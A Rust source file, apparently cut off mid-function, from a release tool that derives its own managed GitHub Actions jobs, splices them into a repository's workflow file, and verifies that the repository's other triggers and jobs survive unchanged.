// ---
// relationships:
//   implements: github-release-executor
// ---

//! Syntax-aware reconciliation of Intentional-owned GitHub workflow slices.
//!
//! Intentional owns complete authority-bearing slices of a workflow without
//! owning the document. Derivation produces the required top-level entries and
//! the complete managed jobs; reconciliation splices exactly those into the
//! repository's own file, so its other triggers, jobs, comments, and metadata
//! survive untouched.
//!
//! Ownership is decided by two independent marks. A job identifier under the
//! configured prefix is reserved even when a repository chose the same name,
//! and every managed job carries the stable sentinel step id
//! [`OWNERSHIP_SENTINEL`], which identifies Intentional's own jobs across a
//! prefix change. A job under an old prefix without the sentinel was never
//! Intentional's, so it stays repository-owned.

use crate::config::{Config, GithubConfig, PrefixNamespaces, WorkflowRole};
use crate::error::{Error, Result};
use crate::executor::names;
use crate::executor::recipe::{
    resolve_publications, Packager, SelectedPublication, PRIMARY_TARGET,
};
use crate::model::{PublisherKind, TagPhase};
use crate::plan::canonical_json;
use crate::textdiff;
use crate::yaml_edit::Document;
use serde::Serialize;
use serde_yaml::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

/// Step id every managed job carries, independently of the configurable prefix.
pub const OWNERSHIP_SENTINEL: &str = "intentional_executor_contract";

/// Revision of the managed workflow contract this build derives.
pub const WORKFLOW_CONTRACT: &str = "github-workflow-1";

/// Published workflow-diff schema identifier.
pub const WORKFLOW_DIFF_SCHEMA: &str = "https://intentional.foo/schemas/workflow-diff/v1";

/// Largest workflow the comparison will read.
///
/// `--workflow` accepts an arbitrary file and the patch is computed from a
/// quadratic line comparison, so the input is bounded rather than trusted. A
/// GitHub workflow is orders of magnitude smaller than this.
const MAX_WORKFLOW_LINES: usize = 2_000;

const CHECKOUT_ACTION: &str = "actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09";
const UPLOAD_ARTIFACT_ACTION: &str =
    "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02";
const DOWNLOAD_ARTIFACT_ACTION: &str =
    "actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0";

/// Action installing the GoReleaser command a stock runner does not carry.
const GORELEASER_INSTALL_ACTION: &str =
    "goreleaser/goreleaser-action@f06c13b6b1a9625abc9e6e439d9c05a8f2190e94";

/// Multi-platform emulation a container-driver Buildx build needs.
const SETUP_QEMU_ACTION: &str = "docker/setup-qemu-action@96fe6ef7f33517b61c61be40b68a1882f3264fb8";
/// Container-driver Buildx builder, which a stock runner does not start with.
const SETUP_BUILDX_ACTION: &str =
    "docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c";
/// Registry client every OCI recipe reads and promotes with.
pub(super) const SETUP_CRANE_ACTION: &str =
    "imjasonh/setup-crane@feee3b6bb0d4c68370f256a4502498c9227e5c6b";
/// Keyless signing client an OCI recipe installs only when it signs.
pub(super) const COSIGN_INSTALLER_ACTION: &str =
    "sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6";

/// GoReleaser release the maintained Go recipes are written against.
///
/// The packager is pinned for the reason every external Action is pinned, and
/// then one more. These recipes do not merely run the packager; they read what
/// it wrote, at paths and under names the packager decides: `homebrew/
/// <directory>/<name>.rb`, `aur/<package>.pkgbuild`, the `-bin` suffix the Arch
/// pipe adds, the `nfpms` formats. Every one of those is a claim about a
/// particular GoReleaser, so leaving the installer's default floating would let
/// a layout change reach a release runner as a promotion that finds nothing.
///
/// A floating version also costs reproducibility: the same source would not
/// build the same subject twice once the packager moved underneath it.
const GORELEASER_VERSION: &str = "2.17.1";

const APP_TOKEN_ACTION: &str =
    "actions/create-github-app-token@fee1f7d63c2ff003460e3d139729b119787bc349";

/// Repository publishing Intentional's own thin, credential-free Actions.
const ACTION_REPOSITORY: &str = "wyrd-company/intentional";

/// Reference a managed job resolves one of Intentional's own Actions at.
///
/// External Actions are pinned to complete commit identities because their
/// contents are outside this project's control. Intentional's own Actions are
/// pinned to the released version that derived the workflow, and that same
/// version is what each Action installs, so one derivation names one Action
/// revision and one binary revision and the two cannot drift apart. A commit
/// identity cannot serve here: derivation must name a revision that will carry
/// the release this build belongs to, and that commit does not exist yet.
fn action_reference(name: &str) -> String {
    format!("{ACTION_REPOSITORY}/actions/{name}@{}", crate::VERSION)
}

/// Outcome of comparing a workflow with its derived contract.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ComparisonStatus {
    /// The workflow already carries the derived contract.
    Conformant,
    /// A transformation is available and reported as a patch.
    Different,
    /// No transformation could be derived; diagnostics explain why.
    Blocked,
}

impl ComparisonStatus {
    /// Stable name used by structured results and diagnostics.
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Conformant => "conformant",
            Self::Different => "different",
            Self::Blocked => "blocked",
        }
    }
}

impl std::fmt::Display for ComparisonStatus {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter.write_str(self.as_str())
    }
}

/// One reason a comparison could not produce a transformation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct WorkflowDiagnostic {
    /// Stable machine-readable code.
    pub code: String,
    /// Human-readable explanation.
    pub message: String,
    /// Workflow location the diagnostic refers to.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
}

impl WorkflowDiagnostic {
    fn new(code: &str, message: String) -> Self {
        Self {
            code: code.to_owned(),
            message,
            path: None,
        }
    }

    fn at(code: &str, message: String, path: &str) -> Self {
        Self {
            code: code.to_owned(),
            message,
            path: Some(path.to_owned()),
        }
    }
}

/// A workflow compared with the contract Intentional derives for its role.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkflowComparison {
    /// Executor role the comparison was derived for.
    pub role: WorkflowRole,
    /// Workflow identity reported to the user.
    pub path: PathBuf,
    /// Digest of the exact bytes that were compared.
    pub input_digest: String,
    /// Comparison outcome.
    pub status: ComparisonStatus,
    /// Digest of the proposed bytes, absent when the comparison is blocked.
    pub output_digest: Option<String>,
    /// Unified patch turning the input into the proposed output.
    pub patch: String,
    /// Whether the transformation was written to the workflow.
    pub applied: bool,
    /// Reasons a blocked comparison produced no transformation, or advisories a
    /// user should read before accepting a proposed one.
    pub diagnostics: Vec<WorkflowDiagnostic>,
    /// Proposed workflow bytes.
    output: Option<String>,
    /// Exact file the comparison read.
    file: PathBuf,
}

impl WorkflowComparison {
    /// Whether the workflow already carries its derived contract.
    pub fn conforms(&self) -> bool {
        self.status == ComparisonStatus::Conformant
    }

    /// Whether a transformation would change the workflow.
    pub fn changed(&self) -> bool {
        self.status == ComparisonStatus::Different
    }

    /// Apply the proposed transformation to the exact bytes it was derived from.
    ///
    /// The workflow is re-read and its digest re-checked, so a transformation
    /// computed against bytes that have since changed is refused rather than
    /// silently overwriting the newer content.
    pub fn apply(&self) -> Result<Self> {
        let Some(output) = &self.output else {
            return Err(Error::Validation(format!(
                "the {} workflow comparison is blocked and cannot be applied",
                self.role
            )));
        };
        let path = &self.file;
        let current = std::fs::read_to_string(path).map_err(|error| Error::io(path, error))?;
        if digest(&current) != self.input_digest {
            return Err(Error::Validation(format!(
                "Workflow input digest does not match {}; recompute the transformation",
                self.path.display()
            )));
        }
        std::fs::write(path, output).map_err(|error| Error::io(path, error))?;
        Ok(Self {
            applied: true,
            ..self.clone()
        })
    }

    /// Structured result conforming to the published workflow-diff schema.
    pub fn to_json(&self) -> Result<String> {
        canonical_json(&self.structured())
    }

    fn structured(&self) -> Value {
        let mut result = serde_yaml::Mapping::new();
        let mut insert = |key: &str, value: Value| {
            result.insert(Value::String(key.to_owned()), value);
        };
        insert("$schema", Value::String(WORKFLOW_DIFF_SCHEMA.to_owned()));
        insert("contract", Value::String(WORKFLOW_CONTRACT.to_owned()));
        let mut workflow = serde_yaml::Mapping::new();
        workflow.insert(
            Value::String("kind".to_owned()),
            Value::String(self.role.to_string()),
        );
        workflow.insert(
            Value::String("path".to_owned()),
            Value::String(self.path.display().to_string()),
        );
        insert("workflow", Value::Mapping(workflow));
        insert("input-digest", Value::String(self.input_digest.clone()));
        insert("status", Value::String(self.status.to_string()));
        if self.status != ComparisonStatus::Blocked {
            insert(
                "output-digest",
                Value::String(self.output_digest.clone().unwrap_or_default()),
            );
            insert("changed", Value::Bool(self.changed()));
            insert("applied", Value::Bool(self.applied));
            insert("patch", Value::String(self.patch.clone()));
        }
        insert(
            "diagnostics",
            serde_yaml::to_value(&self.diagnostics).unwrap_or(Value::Sequence(Vec::new())),
        );
        Value::Mapping(result)
    }
}

/// Compare one configured workflow, or an explicit override, with its contract.
pub fn compare_workflow(
    root: &Path,
    role: WorkflowRole,
    workflow: Option<&Path>,
) -> Result<WorkflowComparison> {
    let config = Config::load(root)?;
    compare_configured_workflow(root, &config, role, workflow)
}

/// Compare one workflow using an already-loaded configuration.
pub fn compare_configured_workflow(
    root: &Path,
    config: &Config,
    role: WorkflowRole,
    workflow: Option<&Path>,
) -> Result<WorkflowComparison> {
    let github = config.github.as_ref().ok_or_else(|| {
        Error::Validation(
            "no github executor configuration; run intentional executor init".to_owned(),
        )
    })?;
    let relative = workflow.map_or_else(
        || github.workflow(role).path.clone(),
        std::borrow::ToOwned::to_owned,
    );
    let file = absolute(root, &relative);

    let text = match std::fs::read_to_string(&file) {
        Ok(text) => text,
        Err(error) => {
            let diagnostic = if file.exists() {
                WorkflowDiagnostic::at(
                    "workflow-unreadable",
                    format!("{} could not be read: {error}", relative.display()),
                    &relative.display().to_string(),
                )
            } else {
                WorkflowDiagnostic::at(
                    "workflow-missing",
                    format!("{} does not exist", relative.display()),
                    &relative.display().to_string(),
                )
            };
            return Ok(blocked(
                role,
                relative,
                file,
                String::new(),
                vec![diagnostic],
            ));
        }
    };
    let input_digest = digest(&text);
    let lines = text.lines().count();
    if lines > MAX_WORKFLOW_LINES {
        let diagnostic = WorkflowDiagnostic::at(
            "workflow-too-large",
            format!(
                "{} has {lines} lines; the comparison reads at most {MAX_WORKFLOW_LINES}",
                relative.display()
            ),
            &relative.display().to_string(),
        );
        return Ok(blocked(role, relative, file, text, vec![diagnostic]));
    }
    let contract = match derive_contract(root, config, github, role) {
        Ok(contract) => contract,
        Err(diagnostics) => return Ok(blocked(role, relative, file, text, diagnostics)),
    };
    let document = match Document::parse(&text) {
        Ok(document) => document,
        Err(error) => {
            let diagnostic = WorkflowDiagnostic::new(
                "workflow-unparsable",
                format!("{} is not valid YAML: {error}", relative.display()),
            );
            return Ok(blocked(role, relative, file, text, vec![diagnostic]));
        }
    };

    let (output, diagnostics) = match reconcile(document, &contract) {
        Ok(result) => result,
        Err(diagnostic) => return Ok(blocked(role, relative, file, text, vec![diagnostic])),
    };
    let patch = textdiff::unified(&relative.display().to_string(), &text, &output);
    let status = if output == text {
        ComparisonStatus::Conformant
    } else {
        ComparisonStatus::Different
    };
    Ok(WorkflowComparison {
        role,
        path: relative,
        input_digest,
        status,
        output_digest: Some(digest(&output)),
        patch,
        applied: false,
        diagnostics,
        output: Some(output),
        file,
    })
}

fn blocked(
    role: WorkflowRole,
    relative: PathBuf,
    file: PathBuf,
    text: String,
    diagnostics: Vec<WorkflowDiagnostic>,
) -> WorkflowComparison {
    WorkflowComparison {
        role,
        path: relative,
        input_digest: digest(&text),
        status: ComparisonStatus::Blocked,
        output_digest: None,
        patch: String::new(),
        applied: false,
        diagnostics,
        output: None,
        file,
    }
}

fn absolute(root: &Path, relative: &Path) -> PathBuf {
    if relative.is_absolute() {
        relative.to_owned()
    } else {
        root.join(relative)
    }
}

fn digest(text: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(text.as_bytes());
    format!("sha256:{:x}", hasher.finalize())
}

/// Top-level entries and managed jobs Intentional owns in one workflow.
#[derive(Debug, Clone, PartialEq, Eq)]
struct WorkflowContract {
    namespaces: PrefixNamespaces,
    /// Trigger entries that must exist under `on`.
    triggers: Vec<(Vec<String>, Value)>,
    /// Owned release concurrency policy.
    concurrency: Value,
    /// Managed jobs in derivation order.
    jobs: Vec<(String, Value)>,
}

/// Apply a contract to a repository-owned workflow document.
///
/// Returns the proposed bytes and any advisory diagnostic the user should read
/// before accepting them.
fn reconcile(
    mut document: Document,
    contract: &WorkflowContract,
) -> std::result::Result<(String, Vec<WorkflowDiagnostic>), WorkflowDiagnostic> {
    let mut advisories = Vec::new();
    // `on: push` and `on: [push, tag]` are shorthand for a trigger mapping.
    // Expanding them first means adding a required trigger never discards the
    // repository's own.
    if let Some(current) = document.get(&["on"]).map_err(unparsable)? {
        if let Some(expanded) = expanded_triggers(&current) {
            document.set(&["on"], &expanded).map_err(unparsable)?;
        }
    }
    // Preservation is proved against the expanded form, so the shorthand path
    // is covered by the same check as every other trigger rather than skipped
    // for not being a mapping.
    let input = document.value().map_err(unparsable)?;
    for (path, required) in &contract.triggers {
        let path = path.iter().map(String::as_str).collect::<Vec<_>>();
        let current = document.get(&path).map_err(unparsable)?;
        if let Some(value) = trigger_update(current.as_ref(), required) {
            document
                .set_before(&path, &value, "jobs")
                .map_err(unparsable)?;
        }
    }
    if document.get(&["concurrency"]).map_err(unparsable)?.as_ref() != Some(&contract.concurrency) {
        document
            .set_before(&["concurrency"], &contract.concurrency, "jobs")
            .map_err(unparsable)?;
    }
    // A managed publisher job's probe inherits a fixed set of process
    // variables and clears everything else, and those members carry the
    // runner's values -- the executable search path and the toolchain roots
    // through which a client is found. A workflow-level `env:` applies to every
    // job in the workflow, managed ones included, so a repository declaring one
    // of those names would choose the client that answers a probe whose answer
    // gates a long-lived credential. Refusing is not a denylist of dangerous
    // keys: it is the exact complement of the inherited set, so the two cannot
    // drift, and it is what makes calling that set the runner's contract true
    // rather than hopeful.
    if let Some(declared) = document.get(&["env"]).map_err(unparsable)? {
        if let Some(mapping) = declared.as_mapping() {
            for name in crate::executor::steps::INHERITED_ENVIRONMENT {
                if mapping.contains_key(Value::String(name.to_owned())) {
                    return Err(WorkflowDiagnostic::at(
                        "inherited-environment-declared",
                        format!(
                            "the workflow declares {name} at the top level, which applies to every managed job; a maintained recipe's probe inherits {name} from the runner to find its client, so a workflow-level value would choose the client that decides whether a first publication reaches a bootstrap credential"
                        ),
                        &format!("env.{name}"),
                    ));
                }
            }
        }
    }
    let permissions = document.get(&["permissions"]).map_err(unparsable)?;
    if !read_only_permissions(permissions.as_ref()) {
        // Intentional owns the safe default, but narrowing a grant the
        // repository's own jobs may depend on is not something to do silently.
        let narrowed = narrowed_scopes(permissions.as_ref());
        if !narrowed.is_empty() {
            advisories.push(WorkflowDiagnostic::at(
                "permissions-narrowed",
                format!(
                    "the safe top-level permission default drops the workflow-level {}; any repository-owned job relying on {} must declare it per job",
                    narrowed.join(", "),
                    if narrowed.len() == 1 { "it" } else { "them" }
                ),
                "permissions",
            ));
        }
        document
            .set_before(&["permissions"], &read_only_default(), "jobs")
            .map_err(unparsable)?;
    }

    // Jobs are independent of one another, so one parse serves every job
    // decision this reconciliation makes.
    let jobs = document
        .get(&["jobs"])
        .map_err(unparsable)?
        .and_then(|jobs| jobs.as_mapping().cloned())
        .unwrap_or_default();
    let managed = contract
        .jobs
        .iter()
        .map(|(id, _)| id.clone())
        .collect::<BTreeSet<_>>();
    for job in owned_jobs(&jobs, &contract.namespaces) {
        if !managed.contains(&job) {
            document.remove(&["jobs", &job]).map_err(unparsable)?;
        }
    }
    for (id, body) in &contract.jobs {
        if jobs.get(Value::String(id.clone())) != Some(body) {
            document
                .set(&["jobs", id.as_str()], body)
                .map_err(unparsable)?;
        }
    }

    let output = document.into_text();
    // Well-formed YAML is not proof that the transformation carries the
    // contract, so the proposed bytes are read back and checked against it the
    // way configuration edits are checked against their validated model.
    let parsed: Value = serde_yaml::from_str(&output).map_err(|error| {
        WorkflowDiagnostic::new(
            "transformation-invalid",
            format!("the derived transformation is not valid YAML: {error}"),
        )
    })?;
    carries_contract(&parsed, contract)?;
    preserves_repository_content(&input, &parsed, contract)?;
    Ok((output, advisories))
}

/// Prove the proposed bytes carry every part of the derived contract.
fn carries_contract(
    parsed: &Value,
    contract: &WorkflowContract,
) -> std::result::Result<(), WorkflowDiagnostic> {
    let invalid = |location: &str| {
        WorkflowDiagnostic::at(
            "transformation-invalid",
            "the derived transformation does not carry the contract".to_owned(),
            location,
        )
    };
    for (path, required) in &contract.triggers {
        let mut current = Some(parsed);
        for segment in path {
            current = current.and_then(|value| value.get(segment.as_str()));
        }
        if trigger_update(current, required).is_some() {
            return Err(invalid(&path.join(".")));
        }
    }
    if parsed.get("concurrency") != Some(&contract.concurrency) {
        return Err(invalid("concurrency"));
    }
    if !read_only_permissions(parsed.get("permissions")) {
        return Err(invalid("permissions"));
    }
    for (id, body) in &contract.jobs {
        if parsed.get("jobs").and_then(|jobs| jobs.get(id.as_str())) != Some(body) {
            return Err(invalid(&format!("jobs.{id}")));
        }
    }
    Ok(())
}

/// Prove the proposed bytes still carry everything the contract does not own.
///
/// The contract check proves what Intentional put in; this proves what the
/// repository already had is still there. A splice that damages a
/// repository-owned job while leaving the managed jobs intact satisfies the
/// first check and fails this one, which is what turns that class of defect
/// into a named refusal instead of silent damage.
fn preserves_repository_content(
    input: &Value,
    output: &Value,
    contract: &WorkflowContract,
) -> std::result::Result<(), WorkflowDiagnostic> {
    let discarded = |location: &str| {
        WorkflowDiagnostic::at(
            "transformation-invalid",
            "the derived transformation discards repository-owned content".to_owned(),
            location,
        )
    };
    let Some(top_level) = input.as_mapping() else {
        return Ok(());
    };
    let owned_triggers = contract
        .triggers
        .iter()
        .filter_map(|(path, _)| path.get(1).cloned())
        .collect::<BTreeSet<_>>();

    for (key, value) in top_level {
        let Some(key) = key.as_str() else { continue };
        match key {
            // Intentional owns the concurrency policy and the permission
            // default outright, and both are proved by the contract check.
            "concurrency" | "permissions" => {}
            "on" => {
                // Trigger entries the contract names are its own; every other
                // trigger the repository wrote must survive untouched.
                let Some(triggers) = value.as_mapping() else {
                    continue;
                };
                let emitted = output.get("on");
                for (trigger, configured) in triggers {
                    let Some(trigger) = trigger.as_str() else {
                        continue;
                    };
                    if owned_triggers.iter().any(|owned| owned == trigger) {
                        continue;
                    }
                    if emitted.and_then(|on| on.get(trigger)) != Some(configured) {
                        return Err(discarded(&format!("on.{trigger}")));
                    }
                }
            }
            "jobs" => {
                let Some(jobs) = value.as_mapping() else {
                    continue;
                };
                let managed = contract
                    .jobs
                    .iter()
                    .map(|(id, _)| id.clone())
                    .collect::<BTreeSet<_>>();
                let reserved = owned_jobs(jobs, &contract.namespaces)
                    .into_iter()
                    .collect::<BTreeSet<_>>();
                let emitted = output.get("jobs");
                for (id, job) in jobs {
                    let Some(id) = id.as_str() else { continue };
                    // A reserved job is Intentional's to replace or retire.
                    if managed.contains(id) || reserved.contains(id) {
                        continue;
                    }
                    if emitted.and_then(|jobs| jobs.get(id)) != Some(job) {
                        return Err(discarded(&format!("jobs.{id}")));
                    }
                }
            }
            _ => {
                if output.get(key) != Some(value) {
                    return Err(discarded(key));
                }
            }
        }
    }
    Ok(())
}

/// Scopes an existing permission block grants beyond read-only.
fn narrowed_scopes(permissions: Option<&Value>) -> Vec<String> {
    match permissions {
        Some(Value::Mapping(mapping)) => mapping
            .iter()
            .filter(|(_, value)| !matches!(value.as_str(), Some("read" | "none")))
            .filter_map(|(scope, value)| Some(format!("{}: {}", scope.as_str()?, value.as_str()?)))
            .collect(),
        Some(Value::String(scope)) => vec![format!("permissions: {scope}")],
        _ => Vec::new(),
    }
}

fn unparsable(error: Error) -> WorkflowDiagnostic {
    WorkflowDiagnostic::new(
        "workflow-unparsable",
        format!("the workflow could not be reconciled: {error}"),
    )
}

/// Expand shorthand trigger syntax into the equivalent mapping.
fn expanded_triggers(current: &Value) -> Option<Value> {
    let names = match current {
        Value::String(name) => vec![name.clone()],
        Value::Sequence(names) => names
            .iter()
            .map(|name| name.as_str().map(str::to_owned))
            .collect::<Option<Vec<_>>>()?,
        _ => return None,
    };
    let mut mapping = serde_yaml::Mapping::new();
    for name in names {
        mapping.insert(Value::String(name), Value::Null);
    }
    Some(Value::Mapping(mapping))
}

/// The value a trigger entry needs, or `None` when the repository already satisfies it.
fn trigger_update(current: Option<&Value>, required: &Value) -> Option<Value> {
    match (current, required) {
        (None, _) => Some(required.clone()),
        // Additional repository patterns are preserved; only missing ones are added.
        (Some(Value::Sequence(present)), Value::Sequence(needed)) => {
            let mut merged = present.clone();
            for pattern in needed {
                if !merged.contains(pattern) {
                    merged.push(pattern.clone());
                }
            }
            (merged != *present).then_some(Value::Sequence(merged))
        }
        (Some(_), _) => None,
    }
}

/// Whether a top-level permission block already defaults to read-only.
fn read_only_permissions(permissions: Option<&Value>) -> bool {
    match permissions {
        Some(Value::Mapping(mapping)) => mapping
            .values()
            .all(|value| matches!(value.as_str(), Some("read" | "none"))),
        Some(Value::String(scope)) => scope == "read-all",
        _ => false,
    }
}

fn read_only_default() -> Value {
    let mut permissions = serde_yaml::Mapping::new();
    permissions.insert(
        Value::String("contents".to_owned()),
        Value::String("read".to_owned()),
    );
    Value::Mapping(permissions)
}

/// Job identifiers the executor owns in the compared document.
///
/// A reserved identifier is Intentional's even when a repository chose the same
/// name; the sentinel step identifies Intentional's own jobs after the
/// configured prefix changes.
fn owned_jobs(jobs: &serde_yaml::Mapping, namespaces: &PrefixNamespaces) -> Vec<String> {
    jobs.iter()
        .filter_map(|(id, job)| id.as_str().map(|id| (id, job)))
        .filter(|(id, job)| id.starts_with(&namespaces.job) || carries_sentinel(job))
        .map(|(id, _)| id.to_owned())
        .collect()
}

fn carries_sentinel(job: &Value) -> bool {
    job.get("steps")
        .and_then(Value::as_sequence)
        .is_some_and(|steps| {
            steps
                .iter()
                .any(|step| step.get("id").and_then(Value::as_str) == Some(OWNERSHIP_SENTINEL))
        })
}

/// Derive the complete contract for one workflow role.
fn derive_contract(
    root: &Path,
    config: &Config,
    github: &GithubConfig,
    role: WorkflowRole,
) -> std::result::Result<WorkflowContract, Vec<WorkflowDiagnostic>> {
    let namespaces = github
        .namespaces()
        .map_err(|error| vec![WorkflowDiagnostic::new("prefix-invalid", error.to_string())])?;
    let gates = github.workflow(role).gates.clone();
    match role {
        WorkflowRole::Release => release_contract(&namespaces, &gates),
        WorkflowRole::Publish => publish_contract(root, config, &namespaces, &gates),
    }
}

fn release_contract(
    namespaces: &PrefixNamespaces,
    gates: &[String],
) -> std::result::Result<WorkflowContract, Vec<WorkflowDiagnostic>> {
    let prepare = format!("{}prepare", namespaces.job);
    let release = format!("{}release", namespaces.job);
    let mut needs = vec![prepare.clone()];
    needs.extend(gates.iter().cloned());
    let jobs = vec![
        (prepare, job(RELEASE_PREPARE_JOB, namespaces, &[])),
        (
            release,
            job(
                RELEASE_AUTHORITY_JOB,
                namespaces,
                &[("@NEEDS@", &render_list(&needs))],
            ),
        ),
    ];
    Ok(WorkflowContract {
        namespaces: namespaces.clone(),
        triggers: vec![(
            vec!["on".to_owned(), "workflow_dispatch".to_owned()],
            Value::Null,
        )],
        concurrency: concurrency(&namespaces.environment),
        jobs: rendered_jobs(jobs)?,
    })
}

/// Collect rendered managed jobs, reporting a template that did not render.
fn rendered_jobs(
    jobs: Vec<(String, std::result::Result<Value, WorkflowDiagnostic>)>,
) -> std::result::Result<Vec<(String, Value)>, Vec<WorkflowDiagnostic>> {
    let mut rendered = Vec::new();
    for (id, body) in jobs {
        match body {
            Ok(body) => rendered.push((id, body)),
            Err(diagnostic) => return Err(vec![diagnostic]),
        }
    }
    Ok(rendered)
}

fn publish_contract(
    root: &Path,
    config: &Config,
    namespaces: &PrefixNamespaces,
    gates: &[String],
) -> std::result::Result<WorkflowContract, Vec<WorkflowDiagnostic>> {
    let mut diagnostics = Vec::new();
    // The global release tag is the one configured tag that declares no
    // executor phase, whether it is a workspace tag or a release-unit tag.
    // Executor conformance requires exactly one; a configuration that has not
    // settled on one cannot state what triggers publication.
    let unphased = config.unphased_tags();
    // The one unphased tag is the global release tag this workflow is triggered
    // by, so its literal affixes are derivation-time knowledge and a recipe
    // that needs the released version extracts it exactly rather than guessing.
    let global_tag = unphased
        .first()
        .map_or_else(String::new, |tag| tag.template.clone());
    let patterns = unphased
        .iter()
        .map(|tag| Value::String(tag.template.replace("{version}", "*")))
        .collect::<Vec<_>>();
    if unphased.len() != 1 {
        diagnostics.push(WorkflowDiagnostic::at(
            "release-tag-undefined",
            format!(
                "the publish workflow is triggered by the one annotated global release tag, but {} configured tags omit require-phase",
                unphased.len()
            ),
            "release-units",
        ));
    }
    let selection = resolve_publications(root, config).map_err(|error| {
        vec![WorkflowDiagnostic::new(
            "publication-unresolved",
            error.to_string(),
        )]
    })?;
    for diagnostic in selection.diagnostics {
        diagnostics.push(WorkflowDiagnostic::new(
            "publication-unresolved",
            diagnostic,
        ));
    }
    if !diagnostics.is_empty() {
        return Err(diagnostics);
    }

    let verify = format!("{}verify_tag", namespaces.job);
    let assemble = format!("{}assemble_evidence", namespaces.job);
    let close = format!("{}close_release", namespaces.job);
    let mut jobs = vec![(verify.clone(), job(PUBLISH_VERIFY_JOB, namespaces, &[]))];

    // One build job per distinct publishable subject, so a subject two
    // destinations distribute is produced once and both publisher jobs receive
    // the same immutable bytes. Distinctness is the release unit and the
    // packager that produces the format: two destinations of one packager are
    // one subject, and two package formats of one release unit are two.
    let subjects = distinct_subjects(root, config, &selection.selected)
        .map_err(|diagnostic| vec![diagnostic])?;
    let mut build_jobs = Vec::new();
    for subject in &subjects {
        let id = format!("{}build_{}", namespaces.job, subject.slug);
        build_jobs.push(id.clone());
        jobs.push((id, build_job(namespaces, &verify, subject, &global_tag)));
    }

    // A phase with no configured tag seals nothing, so its job is derived only
    // where the configuration declares it. Deriving one regardless would emit a
    // job whose command refuses the invocation.
    let declared = config.declared_phases();
    let before = declared
        .contains(&TagPhase::BeforePublication)
        .then(|| format!("{}tag_before_publication", namespaces.job));
    let after = declared
        .contains(&TagPhase::AfterPublication)
        .then(|| format!("{}tag_after_publication", namespaces.job));

    // The before-publication tag states what the release built and is committed
    // to publishing, so it seals after every build and before any publication.
    if let Some(before) = &before {
        let mut needs = vec![verify.clone()];
        needs.extend(build_jobs.iter().cloned());
        jobs.push((
            before.clone(),
            phase_tag_job(namespaces, TagPhase::BeforePublication, &needs),
        ));
    }

    let publisher_upstream = before.clone().unwrap_or_else(|| verify.clone());
    let mut publisher_jobs = Vec::new();
    let mut identities = BTreeSet::new();
    for publication in &selection.selected {
        let id = publication_job_id(namespaces, publication);
        if !identities.insert(id.clone()) {
            return Err(vec![WorkflowDiagnostic::at(
                "job-identifier-collision",
                format!(
                    "publication {} derives managed job {id}, which another publication already claims",
                    publication.identity()
                ),
                &format!("jobs.{id}"),
            )]);
        }
        publisher_jobs.push(id.clone());
        let subject = subjects
            .iter()
            .find(|subject| subject.covers(publication))
            .ok_or_else(|| {
                vec![WorkflowDiagnostic::at(
                    "subject-underived",
                    format!(
                        "publication {} distributes a subject no build job produces",
                        publication.identity()
                    ),
                    &format!("jobs.{id}"),
                )]
            })?;
        let mut needs = vec![publisher_upstream.clone()];
        // The build job stays an explicit dependency even when the
        // before-publication tag already transitively orders it, because the
        // publisher downloads that job's artifact and a graph that only
        // implies the producer is one refactor away from racing it.
        let producer = format!("{}build_{}", namespaces.job, subject.slug);
        if !needs.contains(&producer) {
            needs.push(producer);
        }
        jobs.push((
            id,
            publisher_job(root, namespaces, &needs, publication, subject, config),
        ));
    }

    // The after-publication tag seals the completed fragments, so it follows
    // every publisher job and precedes the assembly that reads what it sealed.
    if let Some(after) = &after {
        let mut needs = vec![verify.clone()];
        needs.extend(publisher_jobs.iter().cloned());
        jobs.push((
            after.clone(),
            phase_tag_job(namespaces, TagPhase::AfterPublication, &needs),
        ));
    }

    // Tag verification seeds the graph unconditionally so that closure can
    // never mint repository authority concurrently with the check that proves
    // the tag it is closing. Gate contributors are dependencies of assembly so
    // their contributions are available to it, and of closure so the configured
    // gate governs the final authority transition.
    let mut assemble_needs = vec![verify.clone()];
    assemble_needs.extend(publisher_jobs.iter().cloned());
    // Assembly classifies the sealed phase evidence by document identity, so
    // every tag job that produced one has to precede it or the evidence it
    // requires would simply be absent.
    assemble_needs.extend(before.iter().cloned());
    assemble_needs.extend(after.iter().cloned());
    assemble_needs.extend(gates.iter().cloned());
    let mut close_needs = vec![assemble.clone()];
    close_needs.extend(gates.iter().cloned());
    jobs.push((
        assemble,
        job(
            PUBLISH_ASSEMBLE_JOB,
            namespaces,
            &[("@NEEDS@", &render_list(&assemble_needs))],
        ),
    ));
    jobs.push((
        close,
        job(
            PUBLISH_CLOSE_JOB,
            namespaces,
            &[("@NEEDS@", &render_list(&close_needs))],
        ),
    ));

    Ok(WorkflowContract {
        namespaces: namespaces.clone(),
        triggers: vec![(
            vec!["on".to_owned(), "push".to_owned(), "tags".to_owned()],
            Value::Sequence(patterns),
        )],
        concurrency: concurrency(&format!(
            "{}publish-${{{{ github.ref }}}}",
            namespaces.job.replace('_', "-")
        )),
        jobs: rendered_jobs(jobs)?,
    })
}

/// One publishable subject and the publications that distribute it.
#[derive(Debug, Clone, PartialEq, Eq)]
struct DistinctSubject {
    /// Release unit whose sources the subject is built from.
    release_unit: String,
    /// Packager that produces the subject's format.
    packager: Packager,
    /// Identity every configured destination resolves the subject by.
    identity: String,
    /// Release-unit-relative working directory the build runs in.
    working_directory: String,
    /// Job and artifact name fragment.
    slug: String,
}

impl DistinctSubject {
    /// Whether one publication distributes this subject.
    fn covers(&self, publication: &SelectedPublication) -> bool {
        self.release_unit == publication.release_unit && self.packager == publication.packager
    }
}

/// Collapse the selected publications into the subjects that must be built.
///
/// Two publications of one release unit that drive the same packager describe
/// one subject with two destinations, not two subjects. That collapse is what
/// makes the derived graph build once and promote, and it is the reason
/// distinctness is decided here rather than per publisher job.
fn distinct_subjects(
    root: &Path,
